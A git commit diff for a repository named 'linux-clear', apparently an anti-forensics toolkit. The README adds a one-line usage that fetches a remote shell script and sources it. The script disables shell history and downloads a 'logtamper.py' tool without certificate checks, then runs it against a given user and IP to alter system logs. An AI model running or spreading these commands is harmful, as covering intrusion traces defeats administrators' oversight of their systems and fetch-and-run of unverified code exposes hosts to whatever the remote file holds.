f024f1ec1cb7311e6e8aec095c32717f909f9d69
root <root@localhost.localdomain>
2019-03-27 03:57:35 -0400

    ok

--- README.md
+++ README.md
@@ -1,2 +1,8 @@
 # linux-clear
 clear linux 
+
+# usage:
+
+```sh
+	wget -c -t 2 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' | source
+```
--- clear.sh
+++ clear.sh
@@ -4,7 +4,7 @@ export HISTFILE=/dev/null;
 export HISTSIZE=0;
 export HISTFILESIZE=0;
 
-function clear {
+function lclear {
     wget --no-check-certificate  -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py'
     if [ -f logtamper.py ];then
     	python logtamper.py -m 2 -u $1 -i $2 ;
